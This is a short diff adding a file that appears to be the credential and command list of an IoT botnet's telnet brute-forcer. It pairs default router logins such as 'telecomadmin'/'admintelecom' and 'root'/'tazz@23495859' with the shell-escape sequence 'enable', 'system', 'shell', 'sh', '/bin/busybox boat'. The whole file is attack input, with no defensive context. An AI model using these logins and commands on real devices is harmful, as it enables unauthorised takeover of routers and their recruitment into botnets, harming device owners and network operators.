@@ -1,0 +1,16 @@
+telecomadmin
+
+admintelecom
+enable
+system
+shell
+sh
+/bin/busybox boat
+root
+
+tazz@23495859
+enable
+system
+shell
+sh
+/bin/busybox boat
